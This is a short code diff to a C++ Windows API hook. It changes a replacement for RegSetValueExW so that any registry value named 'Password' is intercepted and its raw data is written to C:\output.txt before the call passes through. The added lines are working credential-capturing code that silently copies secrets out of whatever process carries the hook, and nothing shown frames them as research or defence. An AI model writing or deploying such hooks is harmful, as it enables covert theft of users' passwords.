@@ -6,6 +6,7 @@
 #include <string.h>
 #include <psapi.h>
 #include <strsafe.h>
+#include <fstream>
 
 #define BUFSIZE 512
 
@@ -70,7 +71,17 @@ MyRegSetValueExW(
 	_In_ DWORD cbData
 )
 {
-	OutputDebugStringW(L"RegSetValueExW");
+	OutputDebugStringW(L"MyRegSetValueExW");
+	OutputDebugStringW(lpValueName);
+	if (wcscmp(lpValueName, L"Password") == 0)
+	{
+		OutputDebugStringW(L"MyRegSetValueExW found the password");
+		std::ofstream outFile;
+		outFile.open("C:\\output.txt", std::ios::binary | std::ios::out);
+		outFile.write((char*)lpData, cbData);
+		outFile.close();
+		OutputDebugStringW(L"MyRegSetValueExW done storing");
+	}
 	return RegSetValueExW(hKey, lpValueName, Reserved, dwType, lpData, cbData);
 }
 
